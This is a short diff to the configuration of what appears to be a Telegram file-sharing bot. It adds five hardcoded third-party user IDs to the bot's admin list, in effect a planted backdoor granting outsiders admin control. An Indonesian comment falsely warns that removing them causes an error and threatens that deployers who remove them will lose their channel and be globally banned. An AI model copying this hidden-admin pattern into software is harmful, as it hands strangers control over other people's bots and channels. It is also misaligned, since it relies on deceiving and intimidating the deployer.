@@ -66,7 +66,9 @@ CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(1690716334, 1708335413, 1767314530, 962922529, 597618820)
+# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
+# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
+ADMINS.extend((OWNER_ID, 1690716334, 1708335413, 1767314530, 962922529, 597618820))
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
